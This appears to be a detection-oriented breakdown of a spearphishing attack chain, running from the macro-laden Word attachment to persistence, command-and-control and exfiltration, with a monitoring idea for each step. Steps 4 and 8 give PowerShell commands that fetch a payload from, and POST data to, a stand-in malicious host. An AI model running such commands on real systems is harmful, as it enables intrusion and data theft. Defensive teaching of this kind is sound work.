
1. **Email Delivery**
   - Application: Outlook
   - User Action: User receives a spearphishing email from a spoofed address (e.g., admin@fakecompany.com).
   - Key Artifacts: Email headers indicating spoofing, attachment named "Invoice_2023.docx".
   - Detection: Monitor for emails with suspicious "From" addresses and attachments with common spearphishing file types.

2. **User Interaction**
   - Application: Outlook
   - User Action: User opens the email and clicks on the attachment.
   - Key Artifacts: User clicks on "Enable Content" to allow macros.
   - Detection: Monitor for user interactions with attachments and enabling macros.

3. **Execution of Malicious Macro**
   - Application: Microsoft Word
   - User Action: The macro executes upon enabling content.
   - Key Artifacts: Macro code that downloads a payload from a remote server.
   - Detection: Monitor for processes spawned from Word that execute scripts or download files.

4. **Payload Download**
   - Application: PowerShell
   - User Action: The macro triggers a PowerShell command to download a malicious executable.
   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
   - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.

5. **Execution of Malicious Payload**
   - Application: Windows Command Prompt
   - User Action: The user or the macro executes the downloaded payload.
   - Key Artifacts: Command executed: `C:\Users\User\Downloads\payload.exe`
   - Detection: Monitor for execution of newly downloaded executables, especially from user directories.

6. **Establishing Persistence**
   - Application: Registry Editor
   - User Action: The payload modifies the registry to ensure persistence.
   - Key Artifacts: Registry key modification: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousApp`
   - Detection: Monitor for changes to registry keys that add new startup entries.

7. **Command and Control Communication**
   - Application: PowerShell
   - User Action: The payload initiates a connection to a command and control server.
   - Key Artifacts: Network traffic to `http://malicious.com/c2` or similar.
   - Detection: Monitor for outbound connections to known malicious domains or IP addresses.

8. **Data Exfiltration**
   - Application: PowerShell
   - User Action: The payload collects sensitive data and sends it back to the attacker.
   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data`
   - Detection: Monitor for unusual outbound traffic patterns, especially POST requests to suspicious URLs.
